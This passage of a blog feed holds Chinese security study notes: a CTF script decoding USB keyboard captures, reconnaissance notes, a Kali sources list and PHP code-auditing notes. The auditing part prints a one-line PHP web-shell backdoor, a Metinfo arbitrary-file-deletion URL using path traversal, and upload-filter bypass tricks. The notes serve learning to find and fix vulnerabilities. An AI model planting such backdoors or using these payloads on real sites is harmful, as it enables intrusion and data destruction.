--profile=Win7SP0x64 hashpump</code></p><p>9.查看网络连接<br><code>volatility -f mem.raw --profile=Win7SP1x64 netscan</code></p><p>10.查看已经建立的网络连接</p><p><code>volatility -f mem.raw --profile=Win7SP1x64 netscan|grep ESTABLISHED</code></p><h2 id="常见解题思路："><a href="#常见解题思路：" class="headerlink" title="常见解题思路："></a>常见解题思路：</h2><blockquote><p>主要找到键盘数据文件</p></blockquote><p>1.根据payload6查看信息，再直接利用foremost分离，将提取的信息结合分离出usb键盘数据文件</p><p>2.结合payload1-3\6,再利用binwalk -e 提取文件，再利用&#96;&#96;&#96;Tshark -r <code>命令查看键盘数据，利用</code>tshark -T fields -e usb.capdata &gt;file.path.name&#96; 输出存为文件，即为键盘数据文件</p><h2 id="USB通杀EXP"><a href="#USB通杀EXP" class="headerlink" title="USB通杀EXP"></a>USB通杀EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">USB流量分析</span></span><br><span class="line"><span class="string">    keyboard scan code转为键盘字符</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">    导出的usb流量信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">&quot;aA&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;bB&quot;</span>, <span class="number">0x06</span>:<span class="string">&quot;cC&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;dD&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;eE&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;fF&quot;</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">&quot;gG&quot;</span>, <span class="number">0x0B</span>:<span class="string">&quot;hH&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;iI&quot;</span>, <span class="number">0x0D</span>:<span class="string">&quot;jJ&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;kK&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;lL&quot;</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">&quot;mM&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;nN&quot;</span>, <span class="number">0x12</span>:<span class="string">&quot;oO&quot;</span>, <span class="number">0x13</span>:<span class="string">&quot;pP&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;qQ&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;rR&quot;</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">&quot;sS&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;tT&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;uU&quot;</span>, <span class="number">0x19</span>:<span class="string">&quot;vV&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;wW&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;xX&quot;</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">&quot;yY&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;zZ&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1!&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2@&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3#&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4$&quot;</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">&quot;5%&quot;</span>, <span class="number">0x23</span>:<span class="string">&quot;6^&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&amp;&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8*&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9(&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0)&quot;</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">&quot;  &quot;</span>, <span class="number">0x2D</span>:<span class="string">&quot;-_&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=+&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&#123;&quot;</span>, <span class="number">0x30</span>:<span class="string">&quot;]&#125;&quot;</span>,  <span class="number">0x32</span>:<span class="string">&quot;#~&quot;</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">&quot;;:&quot;</span>, <span class="number">0x34</span>:<span class="string">&quot;&#x27;\&quot;&quot;</span>,  <span class="number">0x36</span>:<span class="string">&quot;,&lt;&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&gt;&quot;</span>, <span class="number">0x4f</span>:<span class="string">&quot;&gt;&quot;</span>, <span class="number">0x50</span>:<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code2chr</span>(<span class="params">filepath</span>):</span><br><span class="line">    lines = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(filepath,<span class="string">&quot;r&quot;</span>).readlines():</span><br><span class="line">        code = <span class="built_in">int</span>(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)   <span class="comment"># 即第三个字节</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># up arrow - move up</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">            pos -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt;= pos:</span><br><span class="line">            lines.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">81</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">        code2chr(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes on Gathering Information [1]</title>
      <link href="/2019/09/23/Notes-on-Gathering-Information/"/>
      <url>/2019/09/23/Notes-on-Gathering-Information/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>HTTrack:网站克隆</p></li><li><p>Google指令——利用谷歌搜索实践</p></li><li><p>The Harvester:挖掘并利用邮箱地址</p></li><li><p>Whois</p></li><li><p>Netcraft</p></li><li><p>host 工具</p></li><li><p>从DNS中提取信息</p></li><li><p>从电子邮件服务器中提取信息</p></li><li><p>MetaGooFil</p></li><li><p>社会工程学</p></li><li><p>筛选提炼信息：找到可攻击目标</p></li></ul><h1 id="对信息收集的认识误区"><a href="#对信息收集的认识误区" class="headerlink" title="对信息收集的认识误区"></a>对信息收集的认识误区</h1><p>信息收集是渗透测试的中最不受重视的一个环节</p><blockquote><p>这样的认识很明显是打错特所的，正相反，这是最重要的一步，但也是最容易被忽略的一步，那么它的影响程度到底有多大呢？<br>可以毫不夸张的说，在收集目标信息上所花费的时间越多，后续阶段的成功率也就越高。</p></blockquote><h1 id="信息收集浅谈"><a href="#信息收集浅谈" class="headerlink" title="信息收集浅谈"></a>信息收集浅谈</h1><p>信息收集主要分为主动和被动</p><p>主动收集：与目标系统的直接交互，目标系统可能会记录下我们的IP地址及活动</p><p>被动收集：利用Google获取海量信息，不会与目标交互，不会被记录活动</p><p>信息收集的目的在于尽可能多的收集与目标相关的信息。并且收集信息的时候要尽可能将数据集中保存起来。</p><h3 id="HTTrack"><a href="#HTTrack" class="headerlink" title="HTTrack"></a>HTTrack</h3><p>当浏览或者探测某个网站的时间越多，那么我们的活动就越有可能被跟踪(哪怕只是随意的浏览网站)，只要是属于目标的资源，任何时候与之交互都有可能留下痕迹。</p><p>利用HTTrack我们可以从某个网站的本地副本中提取额外或者隐藏的信息<br>HTTrack可以将整个网页逐页下载下来，通过它可以建立完全的脱机副本。<br>Kali命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install webhttrack</span><br></pre></td></tr></table></figure><h3 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h3><p>物理地址和位置、电话号码、电子邮箱地址、运营时间、商业关系、员工姓名、与社会化媒体的联系、以及其他公开的花絮趣闻等等</p><p>综上所述，我们要彻查目标网站，对目标有一个全面的了解：是什么(这是一家什么样的公司)、做什么(具体做什么业务)、公司设在哪里。</p><p>在有了这些基本信息之后，我们可以进入被动侦察(即，被动收集)阶段。</p><h3 id="被动侦察"><a href="#被动侦察" class="headerlink" title="被动侦察"></a>被动侦察</h3><p>首先要做的事利用各大搜索引擎对目标进行地毯式的搜索</p><p>不过 仅仅利用好谷歌，我们就可以完成整个渗透测试工作<br>(推荐看Google Hacking  作者:Jonny)</p><p>不得不提一点，在我们被动侦擦过程中，如果我们点击搜索结果的任何一条链接，都会与目标建立系统的联系，也就回到了主动侦察的模式。。。。。</p><h3 id="Google指令——搜索实践"><a href="#Google指令——搜索实践" class="headerlink" title="Google指令——搜索实践"></a>Google指令——搜索实践</h3><p>指令格式：<br>1)你想要用的指令<br>2)半角冒号<br>3)指令中要用到的具体内容</p><p>Eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain term(搜索某网站我们想知道的信息)</span><br></pre></td></tr></table></figure><p>allintitle:网页标题必须包含所有的关键字才会出现在搜索结果里<br>intitle:只需包含任意一个关键字即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allintitle:index of(查看web服务器上的所有可用的索引目录列表)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin(这条命令用于发现目标网站的管理或者设者页面)</span><br></pre></td></tr></table></figure><blockquote><p>使用Google快照会减少在目标服务器上留下痕迹，而且有机会浏览到原网站已移除的网页和文件。只要是谷歌爬虫抓取过的页面，都会在网页快照中保存一个精简的副本。</p></blockquote><p>cache:让谷歌只显示网页快照里的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache:domain</span><br></pre></td></tr></table></figure><p>filetype:搜索特定文件的扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:pdf</span><br></pre></td></tr></table></figure><p>命令结合使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain filetype:xxx(搜索某网站所有xxx格式的文件)</span><br></pre></td></tr></table></figure><h3 id="利用社交资源"><a href="#利用社交资源" class="headerlink" title="利用社交资源"></a>利用社交资源</h3><p>当我们彻查完目标网页，并借助谷歌服务我们之后，其他社交媒体也会发挥作用。</p><p>一些论坛，或者新闻中心等等可能会出现关于目标的言论，如技术问题。</p><p>简言之，公共论坛算是分享信息并寻求技术支持的宝地。</p><h3 id="The-Harvester"><a href="#The-Harvester" class="headerlink" title="The Harvester"></a>The Harvester</h3><p>….</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Updating Sources</title>
      <link href="/2019/09/09/Kali-Updating-Sources/"/>
      <url>/2019/09/09/Kali-Updating-Sources/</url>
      
        <content type="html"><![CDATA[<p>kali更新源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ moto main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ moto main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://security.kali.org/ moto/updates main contrib non-free </span><br><span class="line">deb-src http://security.kali.org/ moto/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#中科大kali源 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#新加坡kali源 </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb http://security.kali.org/kali-security kali/updates main contrib non-free </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#阿里云kali源 </span><br><span class="line">deb http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#163 Kali源 </span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">#auto </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#浙大 </span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#东软大学 </span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line">#重庆大学 </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#官方源 </span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>更新安装软件列表和软件;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp; apt-get upgrade</span><br></pre></td></tr></table></figure><p>升级软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><p>清理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure><p>重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning Code Auditing [1]</title>
      <link href="/2019/07/25/Learning-Code-Auditing-1/"/>
      <url>/2019/07/25/Learning-Code-Auditing-1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、常见的代码审计工具"><a href="#一、常见的代码审计工具" class="headerlink" title="一、常见的代码审计工具"></a>一、常见的代码审计工具</h1><p>1、Fortify SCA</p><p>Fortify SCA是一个静态的、白盒的软件源代码安全测试工具，它通过内置的五大主要分析引擎：数据流、语义、结</p><p>2、Checkmarx CxSuite</p><p>Checkmarx CxSuite的扫描结果可以以静态报表形式展示，也可以通过可以对软件安全漏洞和质量缺陷在代码的运</p><p>3、360代码卫士</p><p>360代码卫士是360企业安全集团基于多年源代码安全实践经验推出的新一代源代码安全检测解决方案，包括源代码</p><p>4、PHP代码审计工具——RIPS</p><p>参考：<a href="https://www.jianshu.com/p/cd1cb66e4d7d">https://www.jianshu.com/p/cd1cb66e4d7d</a></p><p>5、SEAY代码审计（常用）</p><p>参考：<a href="https://www.oschina.net/p/seay">https://www.oschina.net/p/seay</a></p><p>6、SONARQUBE</p><p>参考：<a href="https://www.cnblogs.com/qiumingcheng/p/7253917.html">https://www.cnblogs.com/qiumingcheng/p/7253917.html</a></p><p>7、COBRA</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/32363880">https://zhuanlan.zhihu.com/p/32363880</a></p><p>8、KIWI</p><p>参考：<a href="https://github.com/alpha1e0/kiwi">https://github.com/alpha1e0/kiwi</a></p><h1 id="二、代码审计中常见的危险函数和字符串"><a href="#二、代码审计中常见的危险函数和字符串" class="headerlink" title="二、代码审计中常见的危险函数和字符串"></a>二、代码审计中常见的危险函数和字符串</h1><h2 id="0x01-整体"><a href="#0x01-整体" class="headerlink" title="0x01 整体"></a>0x01 整体</h2><p>学习代码审计的目标是能够独立完成对一个CMS的代码安全监测。其通用的思路有：</p><p>● 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文</p><p>● 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是</p><p>● 继续跟读首页文件,index.php,了解程序运作时调用了哪些函数和文件</p><p>以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页</p><h2 id="0x02-各种洞洞"><a href="#0x02-各种洞洞" class="headerlink" title="0x02 各种洞洞"></a>0x02 各种洞洞</h2><p>A.文件操作漏洞</p><p>● 能不用文件名参数就不用 尽量不要让用户可控</p><p>● 平行用户的权限 管理员的权限 操作权限</p><p>● 禁止传入参数类似于这种 .. ,&#x2F;,\ 检查传入的参数,做出限制,停止程序往下执行</p><p>1.文件包含漏洞：</p><p>(1) 本地文件包含：</p><p>● 一般存在于模块加载，模板加载，cache调用</p><p>● 包括函数：include()&#x2F;include_once()，require()&#x2F;require_once()寻找可控变量</p><p>(2) 远程文件包含：</p><p>● 前提条件：allow_url_include &#x3D; on</p><p>● 出现频率不如本地包含</p><p>(3) 文件包含截断：</p><p>● %00截断(php版本小于5.3)</p><p>● 问号截断(问号后面相当于请求的参数，伪截断)</p><p>● 英文(.) 反斜杠(&#x2F;) 截断</p><p>2.文件读取(下载)漏洞：</p><p>搜索关键函数:</p><blockquote><p>file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p></blockquote><p>3.文件上传漏洞：</p><p>搜索关键函数:</p><p>move_uploaded_file() 接着看调用这个函数的代码是否存在为限制上传格式或者可以绕过。</p><p>(1) 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用。</p><p>(2) 黑名单扩展名过滤：</p><p>● 限制不够全面：IIS默认支持解析.asp,.cdx, .asa,.cer等。</p><p>● 扩展名可绕过：</p><p>不被允许的文件格式.php，但是我们可以上传文件名为1.php(注意后面有一个空格)</p><p>(3) 文件头 content-type验证绕过：</p><p>● getimagesize()函数：验证文件头只要为GIF89a，就会返回真。</p><p>● 限制$_FILES[“file”][“type”]的值 就是人为限制content-type为可控变量。</p><p>(4) 防范：</p><p>● 使用in_array()或 利用三等于&#x3D;&#x3D;&#x3D;对比扩展名。</p><p>● 保存上传文件是重命名，规则采用时间戳拼接随机数：md5(time() + rand(1,1000))。</p><p>4.文件删除漏洞：</p><p>搜索关键函数：</p><p>● unlink()利用回溯变量的方式</p><p>● 老版本下的session_destroy()，可以删除文件，现已基本被修复。</p><p>Metinfo的任意文件删除漏洞：</p><p>$action &#x3D; delete即可删除.sql的文件，如果文件不是sql直接删除提交的文件名</p><p><a href="http://target.com/recovery.php?&action=delete&filename=../../index.php">http://target.com/recovery.php?&amp;action=delete&amp;filename=../../index.php</a></p><p>B.代码执行漏洞</p><p>1.代码执行函数：</p><p>搜索关键函数：</p><blockquote><p>eval(), assert(), preg_replace(), call_user_func(), call_user_func_array(), arra</p></blockquote><p>(1) preg_replace()函数：</p><blockquote><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</p></blockquote><p>当$pattern处存在e修饰符时，$replacement 会被当做php代码执行。</p><p>(2)mixed call_user_func( callable $callbank [ , mixed $parameter [ , mixed $…)：</p><p>第一个参数为回调函数，第二个参数是回调函数的参数</p><p>(3)eval()和assert()：</p><p>当assert()的参数为字符串时 可执行PHP代码</p><p>【区分】：</p><p>eval(“ phpinfo(); “);【√】 eval(“ phpinfo() “);【X】</p><p>assert(“ phpinfo(); “);【√】 assert(“ phpinfo() “);【√】</p><p>2.动态函数执行：</p><p>动态函数后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>3.命令执行函数：</p><p>搜索关键函数：</p><blockquote><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p></blockquote><p>(1) popen和proc_open()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">popen( &#x27;whoami &gt;&gt; /Users/bingdaojueai/Desktop/1.txt&#x27;, &#x27;r&#x27; ); ?&gt;</span><br></pre></td></tr></table></figure><p>所在路径就会出现一个1.txt 里面的内容为命令执行后的结果</p><p>(2) 反引号命令执行：</p><p>echo whoami; 直接就可以执行命令</p><p>双引号和单引号的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">$a = 1</span><br><span class="line"></span><br><span class="line">echo &quot; $a &quot; output：1</span><br><span class="line"></span><br><span class="line">echo &#x27; $a &#x27; output：$a</span><br></pre></td></tr></table></figure><p>双引号时，可以直接解析变量，造成代码执行漏洞，过狗绕过。</p><p>C.变量覆盖漏洞</p><p>1.函数使用不当：</p><p>● int extract( array &amp;$var_array , int $extract_type &#x3D; EXTR_OVERWRITE , string $prefix &#x3D; null )</p><p>● void parse_str( string $str , array &amp;$arr )</p><p>● bool import_request_variables( string $type , string $prefix )</p><p>2.$$变量覆盖：</p><p>D.逻辑漏洞</p><p>需要思考的问题：</p><p>● 程序是否可以重复安装</p><p>● 修改密码是否存在越权修改其他用户密码</p><p>● 找回密码验证码是否可以暴力破解</p><p>● cookie是否可以预测 验证存在绕过</p><p>1.等于与存在判断绕过：</p><p>(1) in_array(): 比较之前会自动转换类型</p><p>(2)is_numeric():当传入参数为hex时 直接通过并返回true 并且MYSQL可以直接使用hex编码代替字符串明文可以二次注入 并且可能造成XSS漏洞</p><p>(3)双等于&#x3D;&#x3D;和三等于&#x3D;&#x3D;&#x3D;：</p><p>● 双等于会在变量比较时，进行类转换，与in_array()是一样的问题。</p><p>● 三等于是type和value的双重比较，相比之下更加安全。</p><p>2.账户体系中的越权问题：</p><p>● 水平越权：A用户能够以B用户的身份，进行B用户的全部权限操作。前提A用户和B用户拥有相同的权限。</p><p>● 垂直越权：A用户能够以C用户的身份，进行C用户的全部权限操作，前提C用户比A用户拥有更高的权限。</p><p>(1) 未exit&#x2F;return&#x2F;die：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 